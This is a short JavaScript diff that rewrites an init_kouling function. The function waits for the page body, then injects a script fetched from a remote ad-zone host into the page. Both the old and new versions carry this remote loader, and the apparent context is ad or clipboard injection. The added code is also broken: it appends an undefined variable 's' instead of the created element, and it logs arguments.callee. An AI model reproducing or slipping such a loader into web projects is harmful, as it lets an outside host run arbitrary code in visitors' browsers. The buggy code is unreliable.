@@ -47,9 +47,14 @@ var copy = function() {
   }
 };
 function init_kouling(){
-  setTimeout(function(a) { if (!document.body) { return setTimeout(arguments.callee, 50)}
-  var b = document.createElement("script");
-  b.setAttribute('src','http://tiexie0.wang/adzone/get_zkl_js')
-  (a = document.getElementsByTagName("head")) && a[0] && a[0].appendChild(b)
+  setTimeout(function(a) {
+    if (!document.body) {
+      console.log(arguments.callee)
+     return setTimeout(arguments.callee, 50)
+    }
+    var b = document.createElement("script");
+    b.setAttribute('src','http://tiexie0.wang/adzone/get_zkl_js')
+    document.body.appendChild(s)
+  },50)
 }
 init_kouling()
